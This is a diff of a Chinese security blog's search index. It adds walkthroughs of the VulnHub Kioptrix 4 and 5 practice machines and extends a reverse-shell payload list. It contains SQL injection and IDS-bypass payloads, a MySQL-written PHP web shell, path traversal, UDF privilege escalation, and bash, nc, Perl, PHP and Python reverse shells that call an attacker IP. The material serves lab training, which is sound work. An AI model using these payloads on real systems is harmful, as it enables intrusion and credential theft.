@@ -319,10 +319,14 @@
 <p>2&gt;自建局域网宿主机为头即可<code>192.168.xx.1</code>，无需网关和<code>dns</code></p>
 <p>3&gt;可以用<code>centos7</code>虚拟机看一下会自动分配<code>ip</code>吗，如果分配的奇怪可能是因为没有打开<code>VMware DHCP Service</code>或<code>VMware NAT Service</code>，<code>192.168.xx.254</code>一般是<code>VM</code>的<code>DHCP</code>服务器，没有的话可能就是没开启<code>DHCP</code></p>
 <p><strong>工具</strong>：<code>searchsploit</code>(<code>kali</code>)，<a href="https://gitlab.com/exploit-database/">Exploit-DB</a>，<a href="https://github.com/peass-ng/PEASS-ng">扫描提权</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#基础提权</span></span><br><span class="line"><span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用 Python 启动 PTY</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># kali键盘全转发</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#排查SUID</span></span><br><span class="line">find / -perm -4000 -<span class="built_in">type</span> f -<span class="built_in">ls</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
 <span id="more"></span>
 
 <p>准备条件(我用的是<code>wsl2</code>的<code>kali</code>)：</p>
 <figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#kali系统</span><br><span class="line">kali-linux</span><br><span class="line"></span><br><span class="line">#必要的组件和更新	//运行exp</span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade -y</span><br><span class="line">sudo apt install -y build-essential git curl wget unzip vim tmux <span class="built_in">net</span>-tools htop</span><br><span class="line">sudo apt install -y python3 python3-pip python3-venv</span><br><span class="line">sudo apt install -y openjdk-<span class="number">17</span>-jdk</span><br><span class="line">sudo apt install -y libssl-dev</span><br><span class="line">sudo apt install -y netcat-traditional socat tcpdump wireshark</span><br><span class="line">sudo apt install -y nmap traceroute dnsutils</span><br><span class="line">sudo apt install -y exploitdb sqlmap john hydra metasploit-framework</span><br><span class="line">以及其他自定义的必要组件</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#mysql写入文件</span><br><span class="line">SELECT UNHEX(&#x27;你的十六进制码&#x27;) INTO DUMPFILE &#x27;/tmp/revshell&#x27;;</span><br><span class="line"></span><br><span class="line">SELECT &#x27;&lt;?php system(&quot;bash -i &gt;&amp; /dev/tcp/攻击者IP/端口 <span class="number">0</span>&gt;&amp;<span class="number">1</span>&quot;); ?&gt;&#x27; </span><br><span class="line">INTO OUTFILE &#x27;/var/www/html/shell.php&#x27;;</span><br></pre></td></tr></table></figure>
 
 <h1 id="Kioptrix"><a href="#Kioptrix" class="headerlink" title="Kioptrix"></a>Kioptrix</h1><h3 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix Level 1"></a>Kioptrix Level 1</h3><p><code>练习工具的使用</code></p>
 <h5 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#快速扫描</span><br><span class="line">nmap -sn <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">#全端口扫描</span><br><span class="line">nmap -p <span class="number">1</span>-<span class="number">65535</span> -T4 -A -v <span class="number">192</span>.<span class="number">168</span>.<span class="number">110</span>.<span class="number">129</span></span><br></pre></td></tr></table></figure>
@@ -465,12 +469,13 @@
 <p><a href="https://www.freebuf.com/news/170656.html">CTF实战 | Kioptrix（#3）靶机渗透测试 - FreeBuf网络安全行业门户</a></p>
 <p><a href="https://blog.csdn.net/m0_73812072/article/details/155023122">渗透测试——Kioptrix3靶机多种方法渗透提权（脏牛漏洞提权，手把手详细教程）-CSDN博客</a></p>
 <h3 id="Kioptrix-Level-4"><a href="#Kioptrix-Level-4" class="headerlink" title="Kioptrix Level 4"></a>Kioptrix Level 4</h3><p><code>web测试</code></p>
-<p><strong>配置</strong>：<a href="https://www.vulnhub.com/">vulnhub</a>只给了一个虚拟磁盘，下面是我的配置以供参考</p>
+<p>因为是受限环境(<code>IDS</code>)，如果排查<code>SUID</code>或者<code>sql</code>不当被检测到了就会被踢出系统，然后用户还会被封禁；</p>
+<p><strong>配置</strong>：<a href="https://www.vulnhub.com/"><code>vulnhub</code></a>只给了一个虚拟磁盘，配置如下：</p>
 <table>
 <thead>
 <tr>
 <th><strong>设置项</strong></th>
-<th><strong>我配的值</strong></th>
+<th><strong>值</strong></th>
 </tr>
 </thead>
 <tbody><tr>
@@ -490,76 +495,73 @@
 <td>**Linux 2.6.x **</td>
 </tr>
 </tbody></table>
+<p><code>如果服务老是炸掉是正常的，因为我也炸</code></p>
 <h5 id="信息搜集-3"><a href="#信息搜集-3" class="headerlink" title="信息搜集"></a><strong>信息搜集</strong></h5><p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_4/nmap-1.png"></p>
+<p><code>/database.sql</code>泄露了用户名</p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_4/%E7%94%A8%E6%88%B7%E5%90%8D%E6%B3%84%E9%9C%B2.png"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#如果username存在注入可以直接</span><br><span class="line">username <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; OR 1=1 LIMIT 0,1 #&#x27;</span></span><br><span class="line">password <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27; or 1=&#x27;</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>只有一个登录网页，一看没有<code>sql</code>报错，只有<code>php</code>显示一个函数错误，要盲注，找到表和库后直接交给<code>sqlmap</code>吧</p>
+<p>(登录会直接给密码账号的，其实找到账号可以直接登录即可)</p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_4/sql-1.png"></p>
+<h6 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a><code>sql</code>注入</h6><p>通过<code>1=1</code>，<code>1=2</code>回显不同判定可以使用布尔盲注：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">’or 1=1&#x27;</span><br><span class="line">&#x27;or 1=2&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>然后用<code>user()</code>,<code>database()</code>没事，然后用<code>version()</code>、<code>substr</code>有时候没反应，也不知道是有（<code>IDS</code>）还是虚拟机问题</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#x27; and database() like &#x27;a%&#x27; #</span><br><span class="line"></span><br><span class="line">#爆炸了，应该是有IDS，但是简单的大小写就可以绕过了</span><br><span class="line">&#x27; Or VErsion() like &#x27;<span class="number">5</span>%&#x27; #	</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#匹配长度</span><br><span class="line">LIKE &#x27;A_&#x27;</span><br><span class="line">#跑密码</span><br><span class="line">&#x27; or (select password from members.members where username=&#x27;robert&#x27;) like &#x27;A%&#x27; #</span><br></pre></td></tr></table></figure>
+
+<p>或者直接使用<code>sqlmap</code>跑(可能把服务跑崩，当然用<code>bp</code>抓包也可能被插件跑封禁，跑<code>sql</code>没跑好也<code>ban</code>，所以使用<code>sqlmap</code>反而快一些)：</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r <span class="number">1</span>.txt --batch --dbms=mysql --method=POST --level <span class="number">3</span> --risk <span class="number">2</span> -D members -T members -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_4/sqlmap-1.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#基础提权</span></span><br><span class="line"><span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载提权检查工具</span></span><br><span class="line">wget http://xxx/linpeas.sh</span><br><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#排查漏洞</span></span><br><span class="line">./linpeas.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行exp发现无gcc环境</span></span><br><span class="line"><span class="comment">#策略从 “本地编译”转向“寻找现成工具”或“环境提权”</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="方法一：静态编译"><a href="#方法一：静态编译" class="headerlink" title="方法一：静态编译"></a>方法一：静态编译</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -m32 -static 5093.c -o exp_32</span><br></pre></td></tr></table></figure>
+
+<h5 id="方法二：mysql提权"><a href="#方法二：mysql提权" class="headerlink" title="方法二：mysql提权"></a>方法二：<code>mysql</code>提权</h5><p>三个条件：</p>
+<p>1.存在<code>lib_mysqludf_sys.so</code></p>
+<p>2.可增删改</p>
+<p>3.<code>secure_file_priv</code> 必须为空 </p>
+<p>存在<code>mysql</code>以<code>root</code>权限运行，并且无密码，可以用<code>UDF</code>提权；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_exec(&#x27;usermod -a -G admin robert&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_4/sql-ps.png"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用本身密码</span></span><br><span class="line"><span class="built_in">sudo</span> su</span><br></pre></td></tr></table></figure>
+
+<h4 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.freebuf.com/articles/web/427578.html"><code>Vulnhub-Kioptrix4 - FreeBuf</code>网络安全行业门户</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/26496108821"><code>Kioptix Level-4</code> <code>SQL</code>注入</a></p>
+<h3 id="Kioptrix-Level-5"><a href="#Kioptrix-Level-5" class="headerlink" title="Kioptrix Level 5"></a>Kioptrix Level 5</h3><h5 id="信息搜集-4"><a href="#信息搜集-4" class="headerlink" title="信息搜集"></a><strong>信息搜集</strong></h5><p>系统的安装<a href="https://download.freebsd.org/releases/"><code>download.FreeBSD.org</code></a></p>
+<img src="../image/oscp-image-log/easy/Kioptrix_Level_5/信息搜集-1.png" style="zoom:50%;" />
+
+<img src="../image/oscp-image-log/easy/Kioptrix_Level_5/信息搜集-2.png" style="zoom:50%;" />
+
+<img src="../image/oscp-image-log/easy/Kioptrix_Level_5/信息搜集-3.png" style="zoom: 50%;" />
+
+<h5 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h5><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">#存在代码查看的功能有路径遍历---首页就有一个</span><br><span class="line">#		include(&quot;../class/pData.class.php&quot;); </span><br><span class="line">#查看配置文件，配置文件可以通过下载对应的freeBSD来查看</span><br><span class="line">http://192.168.110.135/pChart2.1.3/examples/index.php?Action=View&amp;Script=../../../../../../../../../../../usr/local/etc/apache22/httpd.conf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">#这个配置文件的意思是指定UA可以允许访问</span><br><span class="line"></span><br><span class="line">SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">VirtualHost</span> *<span class="attr">:8080</span>&gt;</span></span><br><span class="line">    DocumentRoot /usr/local/www/apache22/data2</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Directory</span> &quot;/<span class="attr">usr</span>/<span class="attr">local</span>/<span class="attr">www</span>/<span class="attr">apache22</span>/<span class="attr">data2</span>&quot;&gt;</span></span><br><span class="line">    Options Indexes FollowSymLinks</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from env=Mozilla4_browser</span><br><span class="line"><span class="tag">&lt;/<span class="name">Directory</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_5/phptax.png"></p>
+<p>看到存在<code>phptax</code>可以找到<a href="https://sourceforge.net/projects/phptax/">源码</a></p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_5/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1.png"></p>
+<p>之后<code>php</code>解析+文件上传就简单了，参考<a href="https://cliayn.github.io/2025/04/24/payload%E8%AE%B0%E5%BD%95/">payload记录</a>中的PERL REVERSE SHELL</p>
+<p>主要涉及命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&quot;rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc <span class="variable">$ip</span> <span class="variable">$port</span> &gt; /tmp/f&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后发现系统存在下载命令<code>fetch</code>，看了一下内核，然后直接找提权漏洞+提权即可</p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_5/%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF-1.png" alt="系统信息"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fetch http://192.168.xxx.xxx:8000/26368.c</span><br><span class="line">gcc 26368.c -o test1</span><br><span class="line">./test1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_5/kali-1.png" alt="kali"></p>
+<p><img src="/../image/oscp-image-log/easy/Kioptrix_Level_5/%E7%BB%93%E6%9D%9F.png"></p>
 ]]></content>
       <categories>
         <category>Cybersecurity</category>
       </categories>
       <tags>
         <tag>Red team</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>next主题的自定义文件</title>
-    <url>/2026/02/09/next%E4%B8%BB%E9%A2%98%E7%9A%84%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>记录一下<code>hexo</code>的<code>next</code>主题的一些文件是在哪些位置，以防下次想改又要去找，至于怎么改，丢给文本模型跑就行了</p>
-<p><code>NexT version 8.21.1</code></p>
-<span id="more"></span>
-
-<h1 id="1-位置"><a href="#1-位置" class="headerlink" title="1-位置"></a>1-位置</h1><h2 id="1-自定义样式"><a href="#1-自定义样式" class="headerlink" title="1&gt;自定义样式"></a>1&gt;自定义样式</h2><p>next主题下面的<code>_config.yml</code></p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.njk</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.njk</span></span><br><span class="line">  <span class="comment">#sidebar: source/_data/sidebar.njk</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.njk</span></span><br><span class="line">  <span class="comment">#postBodyStart: source/_data/post-body-start.njk</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.njk</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.njk</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.njk</span></span><br><span class="line">  <span class="comment">#variable: source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="comment">#style: source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#style: source/_data/styles.styl</span><br><span class="line">用于更改栏目的透明度、鼠标悬停时的效果、优化手机端的体验都可以从这里改</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#variable: source/_data/variables.styl</span><br><span class="line">圆角设置等</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#bodyEnd: source/_data/body-end.njk</span><br><span class="line">页面上新增标签按钮啥的</span><br></pre></td></tr></table></figure>
-
-<p>值得注意的是，<code>source/_data/body-end.njk</code>等这些是<code>blog</code>下面的<code>source</code>不是<code>next</code>主题下的<code>source</code></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">你博客的绝对路径\blog\source\_data\body-end.njk</span><br></pre></td></tr></table></figure>
-
-<p>其他的我没用到，暂时就不说了</p>
-<h2 id="2-固有的样式更改"><a href="#2-固有的样式更改" class="headerlink" title="2&gt;固有的样式更改"></a>2&gt;固有的样式更改</h2><h3 id="Hexo-NexT-主题侧边栏"><a href="#Hexo-NexT-主题侧边栏" class="headerlink" title="Hexo NexT 主题侧边栏"></a><code>Hexo NexT</code> 主题侧边栏</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">你博客的绝对路径\blog\themes\next\layout\_partials\sidebar\site-overview.njk</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="3-置顶、排序、分页"><a href="#3-置顶、排序、分页" class="headerlink" title="3&gt;置顶、排序、分页"></a>3&gt;置顶、排序、分页</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#如果改了根目录下的config里的order_by还不行的话可以试试这个</span><br><span class="line">你博客的绝对路径\blog\node_modules\hexo-generator-index\lib\generator.js</span><br></pre></td></tr></table></figure>
-
-<p>参考文章：<a href="https://hubojing.github.io/dhygztfl/">Hexo根据更新时间修改文章排序机制</a></p>
-<p>待续。。。</p>
-]]></content>
-      <categories>
-        <category>article</category>
-      </categories>
-      <tags>
-        <tag>article</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>代理记录</title>
-    <url>/2025/08/27/%E4%BB%A3%E7%90%86%E8%AF%A6%E8%A7%A3/</url>
-    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	今天琢磨端口映射的时候懒得输入内网地址，想直接用回显地址找到端口服务的时候硬是找不到</p>
-<h6 id="1-回显地址默认不经代理的解决办法"><a href="#1-回显地址默认不经代理的解决办法" class="headerlink" title="1&gt;回显地址默认不经代理的解决办法"></a>1&gt;回显地址默认不经代理的解决办法</h6><p><a href="https://stackoverflow.com/questions/57419408/how-to-make-firefox-use-a-proxy-server-for-localhost-connections#:~:text=You%20have%20to%20change%20another,in%20about%3Aconfig">stackoverflow网址中的解决办法</a></p>
-<p>简单来说就是进入浏览器的高级配置的首选项进行更改，主要原因在于浏览器的配置默认回显地址不经过代理，如下以火狐浏览器为例：</p>
-<p><img src="/../image/proxy-/1.png"></p>
-<span id="more"></span>
-
-<h1 id="1-局域网映射端口"><a href="#1-局域网映射端口" class="headerlink" title="1-局域网映射端口"></a>1-局域网映射端口</h1><h6 id="1-内网穿透-局域网端口映射"><a href="#1-内网穿透-局域网端口映射" class="headerlink" title="1&gt;内网穿透-&gt;局域网端口映射"></a>1&gt;内网穿透-&gt;局域网端口映射</h6><p>假设我连接了内网的wifi，然后访问它的web服务192.168.123.1:8080，现在我电脑开热点给其他人，让其他人访问内网的web服务，我怎么将192.168.123.1映射到我的热点（热点为nat模式）</p>
-<p>#<strong>解决方案</strong></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line">---</span><br><span class="line">#如果更多的端口映射</span><br><span class="line"><span class="comment">rem 映射Web服务 (HTTP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">80</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">80</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射HTTPS服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">443</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">443</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射远程桌面 (RDP)</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">3389</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">3389</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SSH服务</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">22</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">22</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射你之前设置的8080端口</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">8080</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rem 映射SMB文件共享</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> listenport=<span class="number">445</span> connectaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span> connectport=<span class="number">445</span></span><br><span class="line"></span><br><span class="line">##linux</span><br><span class="line">#启用IP转发（临时）</span><br><span class="line">sudo sysctl -w <span class="built_in">net</span>.ipv4.ip_forward=<span class="number">1</span></span><br><span class="line">#永久</span><br><span class="line">sudo nano /etc/sysctl.conf</span><br><span class="line">#更新</span><br><span class="line">sudo sysctl -p</span><br><span class="line"># 将目标为热点IP:<span class="number">8080</span>的包，转发到内网服务器</span><br><span class="line">sudo iptables -t nat -A PREROUTING -p tcp -i wlan1 --dport <span class="number">8080</span> -j DNAT --to-destination <span class="number">192</span>.<span class="number">168</span>.<span class="number">123</span>.<span class="number">1</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">#查看转发的表-windows</span><br><span class="line">netsh interface portproxy show all</span><br><span class="line">#删除对应的表</span><br><span class="line">netsh interface portproxy delete v4tov4 listenaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">123</span> listenport=<span class="number">8080</span></span><br><span class="line">#清除转发表</span><br><span class="line">netsh interface portproxy reset</span><br><span class="line">#增加对应的转发</span><br><span class="line">netsh interface portproxy add v4tov4 listenaddress=<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">123</span> listenport=<span class="number">8080</span> connectaddress=<span class="number">172</span>.<span class="number">16</span>.<span class="number">5</span>.<span class="number">2</span> connectport=<span class="number">8080</span></span><br></pre></td></tr></table></figure>
-
-<p>当然直接用<strong>Ngrok &#x2F; FRP (Fast Reverse Proxy) &#x2F; ew</strong>等穿透工具都可以</p>
-<p>无互联网开热点的解决方案如下：</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">##windows</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=allow ssid=MyHotspot key=MyPassword123</span><br><span class="line">#开启</span><br><span class="line">netsh wlan <span class="built_in">start</span> hostednetwork</span><br><span class="line">#关闭</span><br><span class="line">netsh wlan stop hostednetwork</span><br><span class="line">#查看</span><br><span class="line">netsh wlan show hostednetwork</span><br><span class="line">#删除</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork <span class="built_in">mode</span>=disallow</span><br><span class="line">#检查是否可以</span><br><span class="line">netsh wlan show drivers</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Cybersecurity</category>
-      </categories>
-      <tags>
-        <tag>article</tag>
       </tags>
   </entry>
   <entry>
@@ -672,24 +674,95 @@
 <td>需要 PHP 命令行模式支持</td>
 </tr>
 </tbody></table>
-<h2 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span>=<span class="string">&quot;192.168.1.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span>=<span class="number">8080</span>;</span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>,<span class="variable">$port</span>);</span><br><span class="line"><span class="variable">$proc</span>=<span class="title function_ invoke__">proc_open</span>(<span class="string">&quot;/bin/sh -i&quot;</span>, <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$sock</span>, <span class="number">1</span>=&gt;<span class="variable">$sock</span>, <span class="number">2</span>=&gt;<span class="variable">$sock</span>),<span class="variable">$pipes</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span>=<span class="string">&quot;192.168.xx.xx&quot;</span>;</span><br><span class="line"><span class="variable">$port</span>=<span class="number">8080</span>;</span><br><span class="line"><span class="variable">$sock</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>,<span class="variable">$port</span>);</span><br><span class="line"><span class="variable">$proc</span>=<span class="title function_ invoke__">proc_open</span>(<span class="string">&quot;/bin/sh -i&quot;</span>, <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$sock</span>, <span class="number">1</span>=&gt;<span class="variable">$sock</span>, <span class="number">2</span>=&gt;<span class="variable">$sock</span>),<span class="variable">$pipes</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.1.1&quot;,监听端口);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
 
-<h2 id="RCE-Reverse-Shell"><a href="#RCE-Reverse-Shell" class="headerlink" title="RCE Reverse Shell"></a>RCE Reverse Shell</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#centos--反弹shell</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="comment">#宿主</span></span><br><span class="line">nc -lvnp <span class="number">8080</span></span><br></pre></td></tr></table></figure>
+<h2 id="PERL-Reverse-Shell"><a href="#PERL-Reverse-Shell" class="headerlink" title="PERL Reverse Shell"></a>PERL Reverse Shell</h2><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.xxx.xx&quot;;$p=8123;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="Python-Reverse-Shell"><a href="#Python-Reverse-Shell" class="headerlink" title="Python Reverse Shell"></a>Python Reverse Shell</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>&quot;,监听端口));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">#python</span><br><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<span class="number">10</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>&quot;,<span class="number">8080</span>));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);subprocess.<span 